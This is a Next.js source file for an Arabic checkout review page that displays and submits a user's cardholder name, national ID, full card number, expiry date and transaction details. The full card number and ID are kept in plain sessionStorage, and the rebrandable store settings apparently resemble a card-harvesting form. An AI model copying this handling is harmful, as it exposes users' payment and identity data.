"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import toast from "react-hot-toast";
import Header from "../../components/Header";
import Footer from "../../components/Footer";
import { useSettings } from "@/lib/useSettings";
import { FormData, TRANSACTION_LABELS } from "@/lib/types";

export default function ReviewPage() {
  const router = useRouter();
  const { settings, loading } = useSettings();
  const [form, setForm] = useState<FormData | null>(null);
  const [submitting, setSubmitting] = useState(false);

  useEffect(() => {
    const saved = sessionStorage.getItem("formData");
    if (!saved) {
      router.replace("/checkout/details");
      return;
    }
    setForm(JSON.parse(saved));
  }, [router]);

  const handleConfirm = async () => {
    if (!form) return;
    setSubmitting(true);
    try {
      const res = await fetch("/api/requests", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(form),
      });
      const data = await res.json();
      if (!res.ok) {
        toast.error(data.error);
        setSubmitting(false);
        return;
      }
      sessionStorage.setItem("trackingNumber", data.trackingNumber);
      sessionStorage.removeItem("formData");
      router.push("/checkout/success");
    } catch {
      toast.error("حدث خطأ، يرجى المحاولة لاحقاً");
    } finally {
      setSubmitting(false);
    }
  };

  if (loading || !form) {
    return <div className="flex-1 flex items-center justify-center"><div className="animate-spin h-8 w-8 border-4 border-primary border-t-transparent rounded-full" /></div>;
  }

  const needsDay = form.transactionType === "installments" || form.transactionType === "deduction";
  const needsAmount = form.transactionType === "refund" || form.transactionType === "payment";

  const rows = [
    { label: "اسم حامل البطاقة", value: form.cardHolderName },
    { label: "رقم الهوية الوطنية", value: form.nationalId },
    { label: "العمر", value: form.age },
    { label: "رقم البطاقة", value: form.cardNumber },
    { label: "تاريخ انتهاء البطاقة", value: form.expiryDate },
    { label: "نوع المعاملة", value: TRANSACTION_LABELS[form.transactionType] },
    ...(needsDay ? [{ label: "يوم تسديد القسط", value: `${form.installmentDay}` }] : []),
    ...(needsAmount ? [{ label: form.transactionType === "refund" ? "مبلغ الاسترجاع" : "مبلغ الدفع", value: `${form.amount} ر.س` }] : []),
  ];

  return (
    <>
      <Header storeName={settings.storeName} logoUrl={settings.logoUrl} />
      <main className="flex-1 flex justify-center px-4 py-10">
        <div className="card max-w-xl w-full space-y-6">
          <h2 className="text-2xl font-bold text-center text-gray-900">مراجعة البيانات</h2>
          <p className="text-center text-gray-500 text-sm">يرجى التأكد من صحة البيانات قبل الإرسال</p>

          <div className="divide-y divide-gray-100">
            {rows.map((r, i) => (
              <div key={i} className="flex justify-between py-3">
                <span className="text-gray-500 text-sm">{r.label}</span>
                <span className="font-medium text-gray-900">{r.value}</span>
              </div>
            ))}
          </div>

          <div className="flex gap-3 pt-4">
            <button onClick={handleConfirm} disabled={submitting} className="btn-primary flex-1" style={{ background: settings.primaryColor }}>
              {submitting ? "جاري الإرسال..." : "تأكيد الإرسال"}
            </button>
            <button onClick={() => router.back()} className="btn-secondary flex-1">رجوع للتعديل</button>
          </div>
        </div>
      </main>
      <Footer storeName={settings.storeName} />
    </>
  );
}
